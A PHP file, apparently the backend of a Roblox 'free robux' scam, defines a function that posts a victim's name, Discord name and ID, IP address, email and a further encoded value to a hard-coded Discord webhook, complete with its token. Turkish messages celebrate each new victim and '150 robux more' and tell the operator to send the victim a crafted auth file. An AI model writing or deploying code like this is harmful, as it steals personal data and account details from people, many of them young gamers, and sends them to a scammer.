<?php
function sendwh($data1,$data2,$data3,$data4,$data55,$getip)
{
    //=======================================================================================================
// Create new webhook in your Discord channel settings and copy&paste URL
//=======================================================================================================

$webhookurl = "https://discord.com/api/webhooks/987447116135796806/zv11FDzNaWfX-ucgmBsaLj7VZTs6ATmTy-PftZ_b4o1tc6hRMB_fn1q6gSHF_ttnf3Vi";

//=======================================================================================================
// Compose message. You can use Markdown
// Message Formatting -- https://discordapp.com/developers/docs/reference#message-formatting
//========================================================================================================

$timestamp = date("c", strtotime("now"));

$json_data = json_encode([
    // Message
    "content" => "biri kay?t oldu lan bilgileri : ",
    
    // Username
    "username" => "piro of piro hook",

    // Avatar URL.
    // Uncoment to replace image set in webhook
    //"avatar_url" => "https://ru.gravatar.com/userimage/28503754/1168e2bddca84fec2a63addb348c571d.jpg?size=512",

    // Text-to-speech
    "tts" => false,

    // File upload
    // "file" => "",

    // Embeds Array
    "embeds" => [
        [
            // Embed Title
            "title" => "biri daha geldi :)",

            // Embed Type
            "type" => "rich",

            // Embed Description
            "description" => "güzel 150 robux daha geldi",

            // URL of title link

            // Timestamp of embed must be formatted as ISO8601
            "timestamp" => $timestamp,

            // Embed left border color in HEX
            "color" => hexdec( "3366ff" ),

            // Footer

            // Thumbnail
            //"thumbnail" => [
            //    "url" => "https://ru.gravatar.com/userimage/28503754/1168e2bddca84fec2a63addb348c571d.jpg?size=400"
            //],

            // Author


            // Additional Fields array
            "fields" => [
                // Field 2
                [
                    "name" => "Name",
                    "value" => $data3,
                    "inline" => true
                ],
                 [
                    "name" => "Discord Name",
                    "value" => $data4,
                    "inline" => false
                ],
                // Field 2
                [
                    "name" => "Discord Id",
                    "value" =>  $data1,
                    "inline" => true
                ], [
                    "name" => "ip",
                    "value" => $getip,
                    "inline" => false
                ],[
                    "name" => "Mail",
                    "value" => $data2,
                    "inline" => false
                ],
                [
                    "name" => "Auth.tuaxa kodu (bunun için bir dosya açın adını Auth.tuaxa yapın içine alttaki kodu yapıştırıp adama dosyayı atın)",
                    "value" =>  base64_encode(base64_encode($data2).",".base64_encode($data55).",".base64_encode($data1)),
                    "inline" => false
                ],
                [
                    "name" => "Adamın vermesi gereken kod : ",
                    "value" =>  base64_encode("-".$data3."-"),
                    "inline" => false
                ],
                // Field 2
                
                // Etc..
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
// If you need to debug, or find out why you can't send message uncomment line below, and execute script.
// echo $response;
curl_close( $ch );
}
?>